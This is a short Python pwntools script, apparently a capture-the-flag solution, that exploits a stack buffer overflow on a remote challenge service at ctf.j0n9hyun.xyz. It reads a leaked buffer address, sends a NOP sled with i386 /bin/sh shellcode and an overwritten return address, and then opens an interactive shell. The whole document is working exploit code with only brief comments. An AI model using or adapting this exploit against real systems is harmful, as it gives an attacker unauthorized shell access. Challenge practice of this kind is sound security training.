from pwn import *

r = remote("ctf.j0n9hyun.xyz",6982)

#Make Payload
shellcode = pwnlib.shellcraft.i386.sh()

payload = "\x90"*(86+4-44)

payload += asm(shellcode)

payload += "A"*50

#Get address
r.recvuntil(": ")

r.sendline("A")

text = r.recv(10)

buf_addr = int(text, 16)

#Finish Payload
payload += p32(buf_addr)

#Send payload
r.recv(1024)

r.sendline("y")

r.recv(1024)

r.sendline(payload)

r.recv(2048)

r.sendline("n")

#interactive
r.interactive()
